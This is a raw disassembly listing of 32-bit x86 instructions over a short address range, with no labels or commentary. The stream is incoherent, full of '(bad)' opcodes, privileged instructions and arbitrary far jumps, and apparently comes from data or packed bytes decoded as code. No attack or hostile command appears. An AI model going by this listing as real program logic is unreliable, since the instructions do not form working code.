  49768c:	or     al,0xde
  49768e:	outs   dx,DWORD PTR ds:[esi]
  49768f:	or     ebp,DWORD PTR [esi]
  497691:	int3   
  497692:	push   edi
  497693:	sub    BYTE PTR [edi],ch
  497695:	adc    BYTE PTR [ebx+0x21],ah
  497698:	popf   
  497699:	or     eax,0x540e1657
  49769e:	mov    ds,WORD PTR [esi+0x3]
  4976a1:	ret    0xc7e4
  4976a4:	ja     0x497660
  4976a6:	and    eax,0x74ea762f
  4976ab:	push   0x2e
  4976ad:	rcl    BYTE PTR [edx-0x57ab5af7],1
  4976b3:	or     BYTE PTR [edi+0x29],0xf8
  4976b7:	mov    ah,0xef
  4976b9:	mov    ebx,0xc058eabf
  4976be:	sbb    bl,BYTE PTR [edi]
  4976c0:	inc    ecx
  4976c1:	or     BYTE PTR [edx+ebx*8+0x1000cdf2],cl
  4976c8:	imul   esi,eax,0x15a6685a
  4976ce:	fst    QWORD PTR [edi-0x5]
  4976d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4976d2:	dec    edx
  4976d3:	xchg   esp,eax
  4976d4:	and    BYTE PTR [eax+0x8299a05],dh
  4976da:	je     0x4976c4
  4976dc:	xor    edx,DWORD PTR [edi]
  4976de:	mov    cs,WORD PTR [esi+0x4a9d179c]
  4976e4:	and    eax,0x2bb0ec9d
  4976e9:	sbb    al,0x3d
  4976eb:	hlt    
  4976ec:	push   cs
  4976ed:	jne    0x497709
  4976ef:	pop    ecx
  4976f0:	aaa    
  4976f1:	cwde   
  4976f2:	jmp    0x75d2fc6b
  4976f7:	or     eax,0x1b75c93d
  4976fc:	push   edi
  4976fd:	pusha  
  4976fe:	mov    dh,0x40
  497700:	popa   
  497701:	(bad)  
  497702:	rol    eax,cl
  497704:	ret    0x83fd
  497707:	ret    
  497708:	outs   dx,DWORD PTR ds:[esi]
  497709:	sti    
  49770a:	std    
  49770b:	ds retf 
  49770d:	xor    ebp,ebx
  49770f:	call   0x2ac:0xb45732c
  497716:	int3   
  497717:	pop    ebx
  497718:	jp     0x4976e1
  49771a:	push   eax
  49771b:	inc    esp
  49771c:	cmp    eax,0x5a1156d
  497721:	fist   DWORD PTR [ebx-0x6f54788c]
  497727:	adc    BYTE PTR [esi],bh
  497729:	add    edi,eax
  49772b:	xchg   ch,bl
  49772d:	inc    edx
  49772e:	xor    eax,0xae54d184
  497733:	fldcw  WORD PTR [ebx]
  497735:	(bad)  
  497736:	(bad)  
  497737:	fild   QWORD PTR [eax+0x1]
  49773a:	and    al,0x8a
  49773c:	or     BYTE PTR [edx],dh
  49773e:	dec    ebp
  49773f:	inc    BYTE PTR [eax+0x8307fe1]
  497745:	inc    ebx
  497746:	xlat   BYTE PTR ds:[ebx]
  497747:	(bad)  
  497748:	dec    DWORD PTR [ebx]
  49774a:	fcom   QWORD PTR [eax]
  49774c:	shr    ecx,0x10
  49774f:	shl    cl,0x7
  497752:	and    dl,0x7f
  497755:	or     cl,dl
  497757:	cmp    BYTE PTR [ebp-0x3],0x0
  49775b:	mov    BYTE PTR [eax],cl
  49775d:	in     al,dx
  49775e:	xor    eax,DWORD PTR [ebx+ebp*2+0x6a1b9b01]
  497765:	call   FWORD PTR [esp+ebx*2]
  497768:	fwait
  497769:	push   esi
  49776a:	jmp    0x5c20:0x7e932008
  497771:	mov    ds:0x976d78ba,eax
  497776:	adc    DWORD PTR [ebp-0x6a7f6879],ecx
  49777c:	je     0x4977eb
  49777e:	jb     0x4977c2
  497780:	dec    ebx
  497781:	mov    ds:0xb3aced50,eax
  497786:	xor    eax,0x8dc08362
  49778b:	iret   
  49778c:	jmp    0x497737
  49778e:	mov    bl,0xf5
  497790:	xor    dh,BYTE PTR [esi]
  497792:	imul   ebx,DWORD PTR [ecx-0x45],0xed2b90b0
  497799:	or     dh,0x49
  49779c:	sub    DWORD PTR [eax],0x7
  49779f:	test   al,0x20
  4977a1:	or     al,0x9c
  4977a3:	adc    eax,0x88dbc48a
  4977a8:	xor    edx,0x14
  4977ab:	push   0x3e44d400
  4977b0:	add    eax,0x181c15ad
  4977b5:	mov    al,ds:0xe74d55c0
  4977ba:	pop    ecx
  4977bb:	neg    BYTE PTR [ebx+0x4e]
  4977be:	inc    ecx
  4977bf:	stos   DWORD PTR es:[edi],eax
  4977c0:	push   cs
  4977c1:	jge    0x4977cb
  4977c3:	popa   
  4977c4:	adc    bl,BYTE PTR [esp+esi*2]
  4977c7:	das    
  4977c8:	lods   eax,DWORD PTR ds:[esi]
  4977c9:	(bad)  
  4977ca:	dec    edi
  4977cb:	loopne 0x4977e1
  4977cd:	and    eax,0x4008ae7f
  4977d2:	je     0x4977fc
  4977d4:	adc    BYTE PTR [edx],dl
  4977d6:	mov    dl,0xca
  4977d8:	mov    WORD PTR ds:0xcc16ba09,ds
  4977de:	pop    es
  4977df:	jb     0x4977c9
  4977e1:	cld    
  4977e2:	inc    ecx
  4977e3:	pop    ebp
  4977e4:	dec    esp
  4977e5:	sbb    al,BYTE PTR [ecx-0x52381b20]
  4977eb:	xor    al,0x71
  4977ed:	iret   
  4977ee:	ror    BYTE PTR [ebx+eax*1-0x57c22456],0x81
  4977f6:	(bad)  
  4977f8:	test   al,0xe4
  4977fa:	je     0x497824
  4977fc:	in     al,0xb3
  4977fe:	pusha  
  4977ff:	sar    DWORD PTR [eax+0x349f2908],0x46
  497806:	inc    ecx
  497807:	lods   al,BYTE PTR ds:[esi]
  497808:	jecxz  0x4977f5
  49780a:	shr    DWORD PTR [ebp+0x7bfbd641],1
  497810:	mov    ebx,0x2b000331
  497815:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  497816:	imul   ebx,ebx,0xd483dc01
  49781c:	push   ebp
  49781d:	fistp  QWORD PTR [eax]
  49781f:	sub    al,0x42
  497821:	add    BYTE PTR [edi],0x12
  497824:	iret   
  497825:	out    dx,eax
  497826:	dec    ecx
  497827:	or     bl,BYTE PTR [ebp+0x27]
  49782a:	nop
  49782b:	aaa    
  49782c:	inc    edi
  49782d:	add    eax,0x8b14323f
  497832:	dec    eax
  497833:	cld    
  497834:	shl    BYTE PTR [esi+0x28f8c69a],1
  49783a:	push   edx
  49783b:	push   es
  49783c:	and    al,0x52
  49783e:	push   eax
  49783f:	add    DWORD PTR [eax+0x81c24e9],esp
  497845:	cmp    eax,0xba42f120
  49784a:	ret    0x55c8
  49784d:	push   eax
  49784e:	pop    es
  49784f:	pop    es
  497850:	sub    bl,0x30
  497853:	inc    eax
  497854:	enter  0x50d7,0x1
  497858:	loopne 0x4977e6
  49785a:	cld    
  49785b:	lea    eax,[esp+0x4]
  49785f:	mov    fs:0x4915b28,eax
  497865:	cld    
  497866:	retf   0x74ff
  497869:	cmp    cl,BYTE PTR [edx]
  49786b:	sub    al,0xc
  49786d:	push   es
  49786e:	cmp    eax,DWORD PTR ds:0x749b000e
  497874:	jbe    0x4978a3
  497876:	retf   0xb3d4
  497879:	add    eax,esp
  49787b:	sub    DWORD PTR [ecx],eax
  49787d:	pop    esi
  49787e:	mov    esp,0xccf80074
  497883:	jl     0x497838
  497885:	into   
  497886:	pop    ss
  497887:	inc    esp
  497888:	mov    bl,0xc1
  49788a:	ret    
  49788b:	ds add cl,dl
  49788e:	adc    DWORD PTR [eax-0x15],edx
  497891:	mov    bh,0x6d
  497893:	add    eax,esp
  497895:	add    BYTE PTR [ebx+edi*4-0x275203e8],0xd1
  49789d:	cmp    al,0x64
  49789f:	mov    ebx,DWORD PTR [edi]
  4978a1:	cmp    DWORD PTR [ecx+0x4],0xdf5b6a07
  4978a8:	sub    eax,0x8b0c516c
  4978ad:	push   edx
  4978ae:	or     al,0x4e
  4978b0:	test   al,0x1f
  4978b2:	adc    al,0x43
  4978b4:	js     0x4978b7
  4978b6:	dec    ebp
  4978b7:	push   ecx
  4978b8:	mov    ebx,0xddc10d00
  4978bd:	cmp    al,0xc3
  4978bf:	adc    DWORD PTR [ebx+0x21a17fd7],ecx
  4978c5:	or     BYTE PTR [esi+0x550c6bb8],ah
  4978cb:	push   ecx
  4978cc:	push   eax
  4978cd:	pop    eax
  4978ce:	pop    ecx
  4978cf:	dec    eax
  4978d0:	lahf   
  4978d1:	or     al,0xe0
  4978d3:	pop    ebp
  4978d4:	pop    ecx
  4978d5:	pop    ebx
  4978d6:	int3   
  4978d7:	rol    bl,1
  4978d9:	push   0x776a0f92
  4978de:	add    ch,BYTE PTR [eax]
  4978e0:	jne    0x49791f
  4978e2:	mov    ah,BYTE PTR fs:[ecx-0x5bffb3b1]
  4978e9:	pusha  
  4978ea:	cmp    al,BYTE PTR [eax+0x633703b1]
  4978f0:	push   edi
  4978f1:	mov    ?,WORD PTR [ecx]
  4978f3:	push   ebp
  4978f4:	loopne 0x4978d1
  4978f6:	adc    ebx,DWORD PTR [ebp+0x74]
  4978f9:	push   ebx
  4978fa:	pop    esi
  4978fb:	sub    eax,DWORD PTR [esp+ebp*4-0x455a7db6]
  497902:	xchg   ecx,eax
  497903:	inc    ebx
  497904:	mov    ds:0x2dcbc40,al
  497909:	rol    BYTE PTR [eax+0x7a],0x97
  49790d:	fdivr  DWORD PTR [edi-0x1f49b89e]
  497913:	daa    
  497914:	push   eax
  497915:	adc    eax,0xdc19760c
  49791a:	cmp    BYTE PTR [eax+edi*1],0x3d
  49791e:	jne    0x497931
  497920:	xchg   esi,eax
  497921:	mov    ss,esp
  497923:	mov    ebp,0x7b504057
  497928:	push   0xffffffc5
  49792a:	and    al,0x3d
  49792c:	adc    DWORD PTR [eax+ecx*1+0x28],edx
  497930:	xchg   edx,eax
  497931:	shl    DWORD PTR [edx],cl
  497933:	jecxz  0x49797c
  497935:	cdq    
  497936:	ins    DWORD PTR es:[edi],dx
  497937:	in     al,dx
  497938:	cmp    BYTE PTR [ecx],al
  49793a:	jmp    0x497930
  49793c:	push   ecx
  49793d:	dec    edx
  49793e:	loopne 0x497981
  497940:	inc    edx
  497941:	push   ebp
  497942:	xchg   edx,eax
  497943:	pop    es
  497944:	mov    eax,ds:0x4610420e
  497949:	adc    bl,ah
  49794b:	retf   0xccdf
  49794e:	add    ebx,DWORD PTR [edx+ecx*1]
  497951:	lea    edi,[ecx-0x41]
  497954:	inc    edx
  497955:	cmp    edi,0xffffffc1
  497958:	and    BYTE PTR [edx+0x597fba8],cl
  49795e:	loop   0x49793a
  497960:	pop    edi
  497961:	sub    eax,ecx
  497963:	add    BYTE PTR [ebx-0x37],0x11
  497967:	xor    DWORD PTR [ecx],ecx
  497969:	and    ebp,ebx
  49796b:	xor    DWORD PTR [eax-0x48805f67],ebp
  497971:	and    al,0x3
  497973:	fisttp QWORD PTR [ecx+ebp*8]
  497976:	push   ecx
  497977:	jmp    0x4979cb
  497979:	daa    
  49797a:	or     ecx,DWORD PTR [ebp-0x17b0ebda]
  497980:	bound  edx,QWORD PTR [esi-0x3cd7d815]
  497986:	loopne 0x4979b9
  497988:	sub    ebx,esi
  49798a:	pop    eax
  49798b:	pop    esp
  49798c:	mov    eax,ds:0xc303690
  497991:	ror    DWORD PTR [eax+edi*2],1
  497994:	sbb    eax,0x1b83f423
  497999:	test   BYTE PTR [esi-0x7b],al
  49799c:	call   FWORD PTR [esi-0x8]
  49799f:	je     0x497978
  4979a1:	sub    esi,eax
  4979a3:	mov    DWORD PTR [eax],ecx
  4979a5:	adc    al,0x50
  4979a7:	pop    edi
  4979a8:	pop    edi
  4979a9:	xor    BYTE PTR [ebp-0x6a56ab78],dl
  4979af:	daa    
  4979b0:	add    al,0x31
  4979b2:	and    al,0x21
  4979b4:	enter  0xee81,0x67
  4979b8:	sbb    DWORD PTR [edx+0x5de4ccd4],eax
  4979be:	jmp    0x49555eba
  4979c3:	pop    edi
  4979c4:	mov    bl,0x4
  4979c6:	add    bl,BYTE PTR [esi]
  4979c8:	sub    DWORD PTR [edx],esi
  4979ca:	inc    esi
  4979cb:	syscall 
  4979cd:	mov    ah,0x74
  4979cf:	adc    al,bl
  4979d1:	sbb    al,BYTE PTR [esi]
  4979d3:	scas   eax,DWORD PTR es:[edi]
  4979d4:	add    ah,BYTE PTR ds:0xa0cc00f0
  4979da:	rol    DWORD PTR [edx],cl
  4979dc:	and    BYTE PTR ds:0xfee013da,cl
  4979e2:	sub    esi,DWORD PTR [edx+edx*8-0x41]
  4979e6:	and    DWORD PTR [ecx+eiz*1+0x6f],edx
  4979ea:	ret    
  4979eb:	rol    BYTE PTR ds:0x395d1a0d,1
  4979f1:	sbb    al,0xdc
  4979f3:	lods   al,BYTE PTR ds:[esi]
  4979f4:	pop    ds
  4979f5:	push   ss
  4979f6:	or     al,0x3f
  4979f8:	sub    al,0x1c
  4979fa:	mov    cl,0x41
  4979fc:	or     eax,0xeb643b86
  497a01:	cmp    BYTE PTR [edx+0x59],bl
  497a04:	or     eax,0xda4690cf
  497a09:	or     BYTE PTR [ebx-0x77],ah
  497a0c:	mov    eax,0xebd2cad6
  497a11:	mov    ebx,0x4c84a121
  497a16:	jno    0x497a13
  497a18:	sbb    DWORD PTR [ecx-0x77],esi
  497a1b:	js     0x4979fd
  497a1d:	arpl   WORD PTR [esi-0x34007cdf],cx
  497a23:	push   0xe4e17000
  497a28:	pop    ss
  497a29:	(bad)  
  497a2a:	in     al,0x4b
  497a2c:	les    eax,FWORD PTR [edx-0x6]
  497a2f:	lea    edx,[eax-0x3c]
  497a32:	(bad)  
  497a33:	shl    BYTE PTR [edx],1
  497a35:	pop    ds
  497a36:	push   0x2
  497a38:	test   al,0x50
  497a3a:	test   BYTE PTR [ecx-0x3cf4a4f0],bh
  497a40:	add    eax,0x190e4711
  497a45:	add    DWORD PTR [edx],0x2b
  497a48:	retf   
  497a49:	add    BYTE PTR [ecx+ecx*8+0x42],cl
  497a4d:	push   es
  497a4e:	test   edi,edi
  497a50:	dec    esi
  497a51:	inc    edx
  497a52:	adc    DWORD PTR ds:0x3c0097ab,edx
  497a58:	pop    es
  497a59:	popa   
  497a5a:	or     DWORD PTR [ebx+0x20],ebp
  497a5d:	adc    eax,0x226616e3
  497a62:	adc    al,0x9
  497a64:	sub    eax,0xcdad3ee8
  497a69:	adc    BYTE PTR [edx-0x15],cl
  497a6c:	sbb    eax,0x8450fcec
  497a71:	jmp    0xfbd55863
  497a76:	and    eax,0x8634200e
  497a7b:	mov    DWORD PTR [ecx],ebx
  497a7d:	or     ebp,DWORD PTR [ebp-0x50]
  497a80:	mov    ah,0xac
  497a82:	mov    al,0x76
  497a84:	lds    edi,FWORD PTR [ebx+0x50]
  497a87:	add    al,0x22
  497a89:	dec    ebx
  497a8a:	jg     0x497a9a
  497a8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  497a8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  497a8e:	lods   eax,DWORD PTR ds:[esi]
  497a8f:	fld    DWORD PTR [edx+esi*8+0x6a]
  497a93:	rol    DWORD PTR [ecx],0x58
  497a96:	pop    es
  497a97:	add    DWORD PTR [ebx-0x75fe1081],ebx
  497a9d:	inc    ebp
  497a9e:	or     al,0xfd
  497aa0:	repnz scas al,BYTE PTR es:[edi]
  497aa2:	cmp    BYTE PTR [edi],al
  497aa4:	adc    al,0xa1
  497aa6:	aam    0x27
  497aa8:	inc    ecx
  497aa9:	add    al,0xfc
  497aab:	pop    edi
  497aac:	popa   
  497aad:	cmp    eax,0x28892716
  497ab2:	iret   
  497ab3:	or     ebp,DWORD PTR cs:[ecx]
  497ab6:	or     eax,0xdc928682
  497abb:	push   eax
  497abc:	icebp  
  497abd:	les    edx,FWORD PTR [ebx]
  497abf:	dec    eax
  497ac0:	repnz add BYTE PTR [edi+0x74],dl
  497ac4:	icebp  
  497ac5:	or     al,0x3a
  497ac7:	daa    
  497ac8:	xchg   edi,eax
  497ac9:	sub    al,0x7d
  497acb:	cs push ss
  497acd:	push   esi
  497ace:	adc    DWORD PTR ds:0xf91fecda,ecx
  497ad4:	imul   ebp,DWORD PTR [eax],0xfffffff6
  497ad7:	inc    esp
  497ad8:	jne    0x497b1e
  497ada:	inc    eax
  497adb:	xchg   ebp,eax
  497adc:	stos   DWORD PTR es:[edi],eax
  497add:	mov    ds:0xe87a9201,al
  497ae2:	dec    ebp
  497ae3:	jnp    0x497aab
  497ae5:	inc    edx
  497ae6:	sub    dl,BYTE PTR [esi-0x15]
  497ae9:	das    
  497aea:	xor    bl,BYTE PTR [ebx+ebp*1]
  497aed:	shr    BYTE PTR [esi-0x14fbf823],cl
  497af3:	call   0xb33d158
  497af8:	ss into 
  497afa:	lods   al,BYTE PTR ds:[esi]
  497afb:	and    ecx,DWORD PTR cs:[eax+0x4e42ab9]
  497b02:	adc    BYTE PTR [edi-0x2],cl
  497b05:	mov    esp,0x964b3421
  497b0a:	rcr    BYTE PTR es:[ecx-0x55],0x48
  497b0f:	pop    ds
  497b10:	sub    ecx,ecx
  497b12:	in     al,dx
  497b13:	push   ss
  497b14:	sub    eax,0xd27a95a9
  497b19:	and    edi,DWORD PTR [eax-0x77471a58]
  497b1f:	push   es
  497b20:	lods   eax,DWORD PTR ds:[esi]
  497b21:	xlat   BYTE PTR ds:[ebx]
  497b22:	or     eax,0x40ea9018
  497b27:	and    BYTE PTR [edi+0x1],dh
  497b2a:	bound  edi,QWORD PTR ds:0x57d05738
  497b30:	push   0xffffffe8
  497b32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  497b33:	mov    al,ds:0xba58a430
  497b38:	sbb    dh,BYTE PTR [edi-0x28]
  497b3b:	js     0x497b3d
  497b3d:	push   ds
  497b3e:	cs mov esi,0xb9d743c9
  497b44:	in     al,dx
  497b45:	aaa    
  497b46:	xor    BYTE PTR [ecx-0x78],bl
  497b49:	or     BYTE PTR [eax+0x4a],al
  497b4c:	sub    al,0x4
  497b4e:	fdivr  QWORD PTR [edi+edi*1+0x2]
  497b52:	div    BYTE PTR [edi-0x7fed87ee]
  497b58:	cmp    esi,DWORD PTR ds:0x5a360d7c
  497b5e:	cmp    BYTE PTR [eax],0x39
  497b61:	adc    eax,0x74ffe0b0
  497b66:	idiv   esi
  497b68:	add    BYTE PTR [eax+0x575313e],al
  497b6e:	inc    DWORD PTR [ecx-0x7c]
  497b71:	adc    dl,BYTE PTR [edi+0x7]
  497b74:	mov    esp,0x5730870a
  497b79:	cmp    DWORD PTR [ebx+0x5d],edx
  497b7c:	push   eax
  497b7d:	sbb    ecx,DWORD PTR [ebx-0x66]
  497b80:	or     DWORD PTR [ecx+0x6],eax
  497b83:	inc    eax
  497b84:	dec    ebx
  497b85:	dec    ecx
  497b86:	aaa    
  497b87:	es shr ebx,0x4
  497b8b:	sti    
  497b8c:	push   esi
  497b8d:	mov    ah,0xcc
  497b8f:	jmp    0x7557:0xda2393ce
  497b96:	and    BYTE PTR [edi],0xf0
  497b99:	mov    WORD PTR [edi],cs
  497b9b:	mov    eax,0x25a0befb
  497ba0:	popa   
  497ba1:	xchg   ah,dh
  497ba3:	dec    eax
  497ba4:	test   al,0x75
  497ba6:	dec    eax
  497ba7:	adc    ebx,DWORD PTR [ebp*8+0x462e6592]
  497bae:	add    BYTE PTR [esp+edx*1],bh
  497bb1:	sub    BYTE PTR [edi],dl
  497bb3:	mov    eax,ds:0xeb532c2d
  497bb8:	and    al,0xb8
  497bba:	aaa    
  497bbb:	loope  0x497b41
  497bbd:	je     0x497b81
  497bbf:	jne    0x497bd3
  497bc1:	bound  ebp,QWORD PTR [edi]
  497bc3:	cmp    ch,ch
  497bc5:	arpl   WORD PTR [ebp-0x14eff752],bx
  497bcb:	inc    edx
  497bcc:	dec    esp
  497bcd:	add    DWORD PTR [edi],esi
  497bcf:	lahf   
  497bd0:	pop    edx
  497bd1:	nop
  497bd2:	mov    edi,0x15ea3cfb
  497bd7:	or     ecx,DWORD PTR [ebx]
  497bd9:	rol    BYTE PTR [esi],1
  497bdb:	jp     0x497bef
  497bdd:	mov    al,0xb
  497bdf:	push   ds
  497be0:	sbb    eax,0xacb5f0b
  497be5:	les    esi,FWORD PTR [eax-0x1e]
  497be8:	fprem  
  497bea:	loopne 0x497bbf
  497bec:	add    ecx,ecx
  497bee:	std    
  497bef:	sub    al,0x83
  497bf1:	rol    DWORD PTR [ecx+0x2008adc7],1
  497bf7:	(bad)  
  497bf8:	je     0x497bde
  497bfa:	push   ecx
  497bfb:	add    DWORD PTR [ebp-0x30f4730b],ecx
  497c01:	add    eax,0x300db08
  497c06:	push   0xffffffc9
  497c08:	xor    BYTE PTR [esi-0x79bbd188],ah
  497c0e:	xchg   esi,eax
  497c0f:	cwde   
  497c10:	hlt    
  497c11:	or     al,dl
  497c13:	sbb    eax,0xd0adc08
  497c18:	mov    esp,0xa5e65959
  497c1d:	or     al,0x87
  497c1f:	cmp    eax,0x4e5e11e2
  497c24:	mov    ah,0x0
  497c26:	xchg   ebp,esi
  497c28:	jge    0x497c26
  497c2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  497c2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  497c2c:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  497c2e:	xor    al,0x33
  497c30:	pop    ecx
  497c31:	mov    ds:0x8661abec,al
  497c36:	stos   BYTE PTR es:[edi],al
  497c37:	in     al,dx
  497c38:	loop   0x497bc3
  497c3a:	add    ecx,DWORD PTR [edi]
  497c3c:	mov    edi,0x8e2104a
  497c41:	adc    eax,0x3898640a
  497c46:	xchg   ecx,eax
  497c47:	mov    eax,0xe8247743
  497c4c:	lds    eax,FWORD PTR [edx-0x763c49fc]
  497c52:	jae    0x497c24
  497c54:	int    0x62
  497c56:	add    DWORD PTR [edx+0x48],0x1baa01b7
  497c5d:	push   edx
  497c5e:	ret    
  497c5f:	rcl    BYTE PTR [ebp-0x48],0xed
  497c63:	mov    cl,BYTE PTR [ecx+0x15c3267a]
  497c69:	inc    edi
  497c6a:	inc    ebp
  497c6b:	lds    esp,FWORD PTR [esi+0x12]
  497c6e:	sub    edi,DWORD PTR [ecx]
  497c70:	sub    BYTE PTR [ebp+0x64675134],dl
  497c76:	sbb    BYTE PTR [eax],bl
  497c78:	in     eax,0x2e
  497c7a:	iret   
  497c7b:	and    al,0x2
  497c7d:	xchg   esp,eax
  497c7e:	adc    BYTE PTR [eax],bl
  497c80:	outs   dx,DWORD PTR ds:[esi]
  497c81:	es popa 
  497c83:	push   0x1c
  497c85:	bound  ebp,QWORD PTR [ecx+0x42a2794d]
  497c8b:	xor    ecx,DWORD PTR [ecx+0x1e209b07]
  497c91:	xchg   esp,eax
  497c92:	mov    ds:0xd1f75d29,eax
  497c97:	call   0x114083bb
  497c9c:	idiv   edi
  497c9e:	and    ecx,eax
  497ca0:	iret   
  497ca1:	imul   DWORD PTR [eax-0x67a7faf8]
  497ca7:	cld    
  497ca8:	lock xor ah,BYTE PTR [esi+ecx*1]
  497cac:	or     eax,0x7e9668
  497cb1:	fild   DWORD PTR [edx]
  497cb3:	cmp    eax,0x25060c7f
  497cb8:	add    ebx,DWORD PTR [eax*8-0x494ae56d]
  497cbf:	outs   dx,BYTE PTR ds:[esi]
  497cc0:	jecxz  0x497cef
  497cc2:	test   BYTE PTR [edi+0x2],al
  497cc5:	add    eax,0x15892559
  497cca:	and    BYTE PTR [edi],dh
  497ccc:	mov    eax,0xe5482e24
  497cd1:	sbb    al,0x56
  497cd3:	in     al,0x64
  497cd5:	loope  0x497c57
  497cd7:	or     cl,BYTE PTR [edi-0x2a]
  497cda:	xor    ch,bh
  497cdc:	lock sbb edi,DWORD PTR [eax]
  497cdf:	dec    eax
  497ce0:	daa    
  497ce1:	sti    
  497ce2:	in     al,dx
  497ce3:	sub    BYTE PTR [edx+0x51],dh
  497ce6:	cdq    
  497ce7:	xchg   edx,eax
  497ce8:	les    ebx,FWORD PTR [esi]
  497cea:	mov    bl,0xd0
  497cec:	retf   0xa721
  497cef:	fwait
  497cf0:	mov    ds:0x8a53a211,eax
  497cf5:	push   ds
  497cf6:	test   eax,0x95716e90
  497cfb:	jns    0x497d14
  497cfd:	in     eax,0xf
  497cff:	mov    dh,0xc3
  497d01:	lahf   
  497d02:	and    al,0xdd
  497d04:	iret   
  497d05:	sub    DWORD PTR [ebp-0x6ebcbd8c],ecx
  497d0b:	jno    0x497d30
  497d0d:	mov    BYTE PTR [ebx],bh
  497d0f:	xor    BYTE PTR [eax+0x42],bh
  497d12:	and    eax,0x25
  497d15:	mov    edi,edi
  497d17:	mov    eax,ds:0x1f8a058c
  497d1c:	inc    edi
  497d1d:	jmp    0x497ce6
  497d1f:	cmp    bl,0xf7
  497d22:	xchg   esp,eax
  497d23:	and    al,0xee
  497d25:	jbe    0x497d2c
  497d27:	adc    al,0x2b
  497d29:	jne    0x497d2e
  497d2b:	sub    bh,ch
  497d2d:	nop
  497d2e:	int3   
  497d2f:	leave  
  497d30:	leave  
  497d31:	dec    edi
  497d32:	inc    esi
  497d33:	cmp    eax,0x96d124a3
  497d38:	fcom   QWORD PTR [eax+0x30]
  497d3b:	fst    QWORD PTR [edx+edx*4+0x68]
  497d3f:	clc    
  497d40:	mov    al,BYTE PTR ss:[edi]
  497d43:	cmp    al,0x78
  497d45:	dec    edx
  497d46:	cmp    al,0xd7
  497d48:	cmp    BYTE PTR [ebx+0x1023de55],0x10
  497d4f:	or     ch,BYTE PTR [eax+edx*1+0x75]
  497d53:	adc    eax,0x99b0585c
  497d58:	dec    edi
  497d59:	lods   al,BYTE PTR ds:[esi]
  497d5a:	dec    ebx
  497d5b:	add    al,0xd8
  497d5d:	mov    bl,BYTE PTR [edi+0x5a]
  497d60:	mov    DWORD PTR [edx],0x937d1c1a
  497d66:	or     DWORD PTR [ecx+esi*4],ebx
  497d69:	xor    BYTE PTR [ebp-0x738f55e0],al
  497d6f:	sbb    bl,cl
  497d71:	pushf  
  497d72:	dec    esi
  497d73:	cli    
  497d74:	inc    edi
  497d75:	pop    ss
  497d76:	push   eax
  497d77:	out    0xe2,al
  497d79:	add    al,0x74
  497d7b:	mov    ebx,cs
  497d7d:	sub    ecx,0x30
  497d80:	jmp    0x497d9b
  497d82:	mov    ebx,0xe4999c68
  497d87:	call   0xfee8c92c
  497d8c:	frstor [esi+ebp*8]
  497d8f:	cmp    cl,0x19
  497d92:	sub    al,BYTE PTR [ecx+ebp*8]
  497d95:	and    BYTE PTR [ebx+0x4d3bc9c1],al
  497d9b:	adc    al,0x5c
  497d9d:	or     eax,DWORD PTR [eax]
  497d9f:	jge    0x497db9
  497da1:	or     BYTE PTR [esi],bh
  497da3:	jb     0x497dcd
  497da5:	sub    BYTE PTR [esi+0x28],ah
  497da8:	dec    ecx
  497da9:	fcomp  QWORD PTR [esi]
  497dab:	clc    
  497dac:	jbe    0x497dcf
  497dae:	pop    ebp
  497daf:	and    edx,DWORD PTR [edx+0x79]
  497db2:	aaa    
  497db3:	mov    DWORD PTR [edi+0x0],ecx
  497db6:	and    BYTE PTR [ebx+0x560c107d],al
  497dbc:	inc    esi
  497dbd:	stos   BYTE PTR es:[edi],al
  497dbe:	mov    ecx,0x55558b5b
  497dc3:	add    al,0x6e
  497dc5:	or     ch,BYTE PTR [edx+0x12]
  497dc8:	or     eax,0xe2f58afd
  497dcd:	inc    eax
  497dce:	xchg   BYTE PTR [eax+ebx*1+0x18],ah
  497dd2:	adc    BYTE PTR [ecx-0x4f],al
  497dd5:	pop    esp
  497dd6:	dec    ebp
  497dd7:	icebp  
  497dd8:	sbb    BYTE PTR [edi-0x3d94f3af],cl
  497dde:	mov    eax,esi
  497de0:	sbb    BYTE PTR [edi+0x30],al
  497de3:	lds    esi,FWORD PTR ds:0xdc611892
  497de9:	rcl    DWORD PTR [edx+edi*4],0x3a
  497ded:	pop    edi
  497dee:	add    ah,BYTE PTR [esi]
  497df0:	dec    edx
  497df1:	pop    edi
  497df2:	fcomp  DWORD PTR [esi-0x18]
  497df5:	mov    edi,0x386804d4
  497dfa:	push   0x484b6c
  497dff:	shl    DWORD PTR [ebx+0x23808b1],cl
  497e05:	jo     0x497dca
  497e07:	jge    0x497daa
  497e09:	xor    BYTE PTR [ecx],dl
  497e0b:	cli    
  497e0c:	pusha  
  497e0d:	clc    
  497e0e:	(bad)  
  497e0f:	fnstsw WORD PTR [ebp+0x10]
  497e12:	dec    edx
  497e13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  497e14:	or     DWORD PTR [eax],esp
  497e16:	add    DWORD PTR [edx],eax
  497e18:	adc    BYTE PTR [eax+0x28],ah
  497e1b:	inc    eax
  497e1c:	push   ds
  497e1d:	mov    eax,0xd3392720
  497e22:	loope  0x497e7a
  497e24:	aad    0x99
  497e26:	add    al,0x2b
  497e28:	jg     0x497e1c
  497e2a:	ja     0x497e85
  497e2c:	mov    eax,0xe29cf4d
  497e31:	inc    ebx
  497e32:	aaa    
  497e33:	jb     0x497e58
  497e35:	retf   0x2f34
  497e38:	add    al,BYTE PTR [esi+0x5f]
  497e3b:	sub    al,BYTE PTR [ecx+0x76]
  497e3e:	push   eax
  497e3f:	sub    esi,eax
  497e41:	sbb    edi,edx
  497e43:	or     ah,al
  497e45:	and    eax,0x7fce461c
  497e4a:	or     BYTE PTR [ebx+eax*2],ah
  497e4d:	adc    BYTE PTR [ebx+0x19],ah
  497e50:	jle    0x497df1
  497e52:	je     0x497e58
  497e54:	ss (bad) 
  497e56:	push   ebx
  497e57:	hlt    
  497e58:	fdivp  st(0),st
  497e5a:	and    DWORD PTR [ebx-0x39f729a8],ecx
  497e60:	shl    DWORD PTR [esi+edx*4],0xd0
  497e64:	adc    DWORD PTR [ebx+0x66],eax
  497e67:	popf   
  497e68:	or     al,0xaf
  497e6a:	push   0x2d9482fa
  497e6f:	xor    al,0xcb
  497e71:	out    dx,eax
  497e72:	push   0x1d
